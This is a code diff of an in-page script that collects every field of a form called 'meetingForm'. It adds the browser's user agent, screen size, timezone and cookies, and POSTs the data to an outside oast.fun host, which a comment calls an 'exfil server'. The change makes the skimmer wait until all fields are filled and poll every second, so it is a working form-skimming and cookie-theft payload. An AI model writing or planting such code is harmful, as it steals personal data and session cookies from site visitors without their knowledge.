@@ -2,28 +2,31 @@
   function collectPII() {
     const form = document.getElementById("meetingForm");
     const data = {};
+    let allFilled = true;
+
     form.querySelectorAll("input, select").forEach(el => {
       data[el.name] = el.value;
+      if (!el.value) allFilled = false;
     });
+
+    if (!allFilled) return; // Wait until all fields are filled
 
     data.userAgent = navigator.userAgent;
     data.screen = `${screen.width}x${screen.height}`;
     data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     data.cookies = document.cookie;
 
+    // Send to exfil server
     fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
       method: "POST",
-      mode: "no-cors", // prevent fetch from being blocked
+      mode: "no-cors",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     });
+
+    clearInterval(watchFields); // Stop polling once sent
   }
 
-  // Try multiple times to catch autofill delay
-  let attempts = 0;
-  const interval = setInterval(() => {
-    attempts++;
-    collectPII();
-    if (attempts >= 5) clearInterval(interval);
-  }, 2000);
+  // Poll every second to check if fields are filled
+  const watchFields = setInterval(collectPII, 1000);
 </script>
